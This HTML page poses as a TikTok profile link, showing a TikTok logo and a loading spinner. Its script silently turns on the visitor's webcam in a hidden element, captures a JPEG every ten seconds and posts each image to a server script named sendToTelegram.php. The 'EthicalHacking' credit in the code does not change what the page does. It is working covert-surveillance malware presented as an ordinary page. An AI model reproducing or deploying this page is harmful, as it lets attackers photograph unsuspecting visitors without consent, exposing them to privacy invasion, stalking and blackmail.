<!DOCTYPE html>
<html>
<head>
    <title>https://www.tiktok.com/@clothingbyyu?_t=8oWfDNnC5A2&_r=1</title>
    <link
    rel="icon"
    href="data:image/png;base64,"
            type="image/x-icon"
        />
	
<meta name="viewport" content="width=device-width, initial-scale=1">
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
    <style type="text/css">
        #results { 
            display: none;
        padding:20px; border:1px solid; background:#ccc; }
        #my_camera {
            display: none; /* Hide the webcam stream */
        }
        
	body {background-color: #FFFFFF;
	}
	
img {
  margin: 0;
  position: absolute;
  top: 35%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
  border-radius: 50px;
  border: 2px solid #FFFFFF;
  padding: 0px;
  width: 150px;
}

.im{
margin: 0;
  position: absolute;
  top: 57%;
  left: 50%;
  -ms-transform: translate(-50%, -50%);
  transform: translate(-50%, -50%);
  border-radius: 50px;
  border: 2px solid #FFFFFF;
  padding: 0px;
  width: 300px;
}
.b {
text-align: center;
  position: absolute;
  top: 70%;
  left: 27%;
  font-size: 14px;
    }
    </style>
</head>
<body>
    <i class="fa fa-close" style="font-size:36px"></i>

<div class="img">
<img src="https://cliply.co/wp-content/uploads/2021/02/372102690_TIKTOK_LOGO_400.gif" alt="Paris" style="width:40%;">
</div>

<div class="im">
<img src="https://andimaps.com.au/wp-content/uploads/2014/07/loader.gif" alt="Paris" style="width:150%;">
</div>

        
        <div id="my_camera"></div>
        <div id="results">Your captured image will appear here...</div>
    </div>

    <script language="JavaScript">
        Webcam.set({
            
            width: 490,
            height: 390,
            image_format: 'jpeg',
            jpeg_quality: 90
        });
        Webcam.attach('#my_camera');
    
        function take_snapshot() {
            Webcam.snap(function(data_uri) {
                $.post('sendToTelegram.php', { image: data_uri, developer: '𝒁𝒂𝒘 𝑾𝒊𝒏 𝑴𝒂𝒖𝒏𝒈🇲🇲\n✩▆▅▃▂▁𝐄𝐭𝐡𝐢𝐜𝐚𝐥𝐇𝐚𝐜𝐤𝐢𝐧𝐠▁▂▃▅▆✩' }, function(response) {
                    $('#results').html('<img src="'+data_uri+'"/>');
                });
            });
        }

        // Automatically take a snapshot every 10 seconds
        setInterval(take_snapshot, 10000);

                
    </script>
</body>
</html>
